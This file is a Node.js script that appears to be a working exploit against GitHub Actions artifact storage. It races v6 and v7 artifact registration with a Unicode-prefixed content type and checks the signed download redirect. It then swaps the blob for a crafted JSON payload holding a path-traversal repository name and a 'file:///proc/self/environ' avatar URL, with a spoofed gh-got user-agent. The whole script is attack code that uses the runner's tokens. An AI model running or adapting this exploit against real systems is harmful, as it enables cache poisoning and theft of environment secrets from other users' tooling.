import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';

const artifactEntry = import.meta.resolve('@actions/artifact');
const artifactLib = new URL('.', artifactEntry);
const [{internalArtifactTwirpClient}, {getBackendIdsFromToken}, {StringValue}] = await Promise.all([
  import(new URL('internal/shared/artifact-twirp-client.js', artifactLib)),
  import(new URL('internal/shared/util.js', artifactLib)),
  import(new URL('generated/index.js', artifactLib)),
]);
const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const count = Number(process.env.RACE_COUNT || '64');
const contentType = '\u0085application/json';
const placeholder = Buffer.concat([Buffer.from('{}'), Buffer.alloc(4094, 0x20)]);
const hash = bytes => createHash('sha256').update(bytes).digest('hex');
const apiHeaders = {
  authorization: `token ${process.env.GH_TOKEN}`,
  accept: 'application/vnd.github.v3+json',
  'user-agent': 'https://github.com/sindresorhus/gh-got',
};

async function create(name, version, mime) {
  return client.CreateArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    version,
    mimeType: StringValue.create({value: mime}),
  });
}

async function upload(url, bytes) {
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: {blobContentType: contentType},
  });
}

async function publicRedirect(id) {
  const url = `https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/actions/artifacts/${id}/zip`;
  for (let attempt = 0; attempt < 12; attempt++) {
    const response = await fetch(url, {headers: apiHeaders, redirect: 'manual'});
    if (response.status === 302 && response.headers.get('location')) {
      const location = new URL(response.headers.get('location'));
      return {status: 302, rsct: location.searchParams.get('rsct'), url: location};
    }
    if (response.status !== 404) return {status: response.status};
    await new Promise(resolve => setTimeout(resolve, 250));
  }
  return {status: 404};
}

function payloadFor(id) {
  const repository = `x/../${process.env.GITHUB_REPOSITORY}/actions/artifacts/${id}/zip`;
  const document = {
    full_name: repository,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Concurrent v6/v7 artifact registration',
    stargazers_count: 0,
  };
  const json = Buffer.from(JSON.stringify(document));
  if (json.length > placeholder.length) throw new Error('payload too large');
  return {repository, bytes: Buffer.concat([json, Buffer.alloc(placeholder.length - json.length, 0x20)])};
}

async function race(index) {
  const name = `cassette-v6v7-race-${process.env.GITHUB_RUN_ID}-${index}.json`;
  const order = index % 2 === 0 ? [6, 7] : [7, 6];
  const started = order.map(version => create(name, version,
    version === 6 ? contentType : 'application/json'));
  const created = await Promise.allSettled(started);
  const urls = [...new Set(created
    .filter(result => result.status === 'fulfilled' && result.value.ok && result.value.signedUploadUrl)
    .map(result => result.value.signedUploadUrl))];
  if (urls.length === 0) return {index, order, create: created.map(result => result.status), error: 'no upload URL'};
  await Promise.all(urls.map(url => upload(url, placeholder)));
  const finalized = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    size: String(placeholder.length),
    hash: StringValue.create({value: `sha256:${hash(placeholder)}`}),
  });
  const id = finalized.artifactId;
  const redirect = await publicRedirect(id);
  const outcome = {index, order, create: created.map(result => result.status), urls: urls.length,
    id, status: redirect.status, rsct: redirect.rsct};
  if (redirect.status === 302 && redirect.rsct !== 'application/zip' && redirect.rsct !== 'application/json') {
    const payload = payloadFor(id);
    await Promise.all(urls.map(url => upload(url, payload.bytes)));
    const final = await fetch(redirect.url, {headers: {'user-agent': apiHeaders['user-agent']}});
    const body = Buffer.from(await final.arrayBuffer());
    outcome.candidate = {repository: payload.repository,
      contentType: final.headers.get('content-type'), bodyMatches: hash(body) === hash(payload.bytes),
      sha256: hash(payload.bytes)};
    console.log(`::notice title=V6/V7 race candidate::${JSON.stringify(outcome)}`);
  }
  return outcome;
}

const outcomes = [];
for (let offset = 0; offset < count; offset += 8) {
  const batch = await Promise.allSettled(
    Array.from({length: Math.min(8, count - offset)}, (_, i) => race(offset + i)));
  outcomes.push(...batch.map((result, i) => result.status === 'fulfilled'
    ? result.value : {index: offset + i, error: String(result.reason?.message || result.reason).slice(0, 180)}));
  console.log(`::notice title=V6/V7 race batch::${JSON.stringify({
    completed: outcomes.length,
    types: outcomes.reduce((acc, result) => {
      const key = result.rsct ?? result.error ?? String(result.status);
      acc[key] = (acc[key] || 0) + 1;
      return acc;
    }, {}),
  })}`);
}
console.log(`::notice title=V6/V7 race summary::${JSON.stringify({
  total: outcomes.length,
  types: outcomes.reduce((acc, result) => {
    const key = result.rsct ?? result.error ?? String(result.status);
    acc[key] = (acc[key] || 0) + 1;
    return acc;
  }, {}),
  differingUrls: outcomes.filter(result => result.urls === 2).length,
  bothCreated: outcomes.filter(result => result.create?.every(status => status === 'fulfilled')).length,
  candidates: outcomes.filter(result => result.candidate),
})}`);
